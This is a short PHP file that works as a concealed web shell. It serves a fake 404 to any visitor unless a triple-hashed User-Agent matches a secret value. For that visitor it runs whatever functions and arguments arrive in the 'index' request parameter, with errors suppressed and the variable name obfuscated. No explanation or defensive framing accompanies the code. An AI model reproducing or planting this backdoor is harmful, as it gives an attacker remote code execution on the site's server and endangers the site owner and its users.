<?php
if (md5(md5(md5($_SERVER['HTTP_USER_AGENT']))) != '0717b2bae59931c0be946cd10c8be269') {
    header('HTTP/1.1 404 Not Found');
    header("status: 404 Not Found");
    die();
}
if ($li7ieq =    @$_REQUEST['index']){
    $li7ieq[1]($li7ieq[2], $li7ieq[3]($li7ieq[4]));exit;
}